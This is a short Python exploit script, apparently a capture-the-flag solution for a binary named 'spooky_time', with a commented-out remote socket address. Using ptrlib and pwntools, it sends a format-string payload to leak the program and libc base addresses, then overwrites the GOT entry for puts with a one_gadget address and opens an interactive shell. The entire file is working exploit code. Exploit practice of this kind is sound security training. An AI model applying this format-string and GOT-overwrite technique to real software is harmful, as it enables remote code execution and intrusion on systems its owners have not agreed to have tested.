#!/usr/bin/env python

import ptrlib as ptr
from pwn import fmtstr_payload
import pwn


def unwrap(x):
    if x is None:
        print("failed to unwrap")
        exit(1)

    else:
        return x


exe = ptr.ELF("./spooky_time")
libc = ptr.ELF("./glibc/libc.so.6")
ld = ptr.ELF("./glibc/ld-linux-x86-64.so.2")
io = ptr.Process(exe.filepath)
# io = ptr.Socket("83.136.254.13", 33060)

pwn.context.binary = pwn.ELF("spooky_time")

one_gadgets = [
    0xEBCF1,
    0xEBCF5,
    0xEBCF8,
    0xEBD52,
    0xEBDA8,
    0xEBDAF,
    0xEBDB3,
]

payload = b"%36$p.%3$p."
io.sendline(payload)
io.recvuntil(b"Seriously??")
io.recvline()
leak = io.recvline().split(b".")[:-1]
exe.base = int(leak[0], 16) - 0x40
libc.base = int(leak[1], 16) - 0x114A37

payload = fmtstr_payload(8, {unwrap(exe.got("puts")): libc.base + one_gadgets[1]})
io.sendline(payload)

io.sendline(b"echo pwned!")
io.recvuntil(b"pwned!")
io.sh()
